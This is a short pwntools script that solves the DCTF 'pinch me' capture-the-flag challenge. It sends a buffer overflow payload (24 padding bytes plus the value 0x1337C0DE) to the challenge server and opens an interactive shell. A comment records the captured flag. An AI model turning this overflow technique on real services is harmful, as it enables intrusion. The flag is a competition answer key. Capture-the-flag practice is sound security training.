#!/usr/bin/env python

from pwn import *

host = "dctf1-chall-pinch-me.westeurope.azurecontainer.io"
port = 7480

p = remote(host, port)

payload = "A" * 24 + p64(0x1337C0DE)
p.recvuntil("Am I dreaming?")
p.sendline(payload)
p.interactive()

# cat flag.txt
# dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}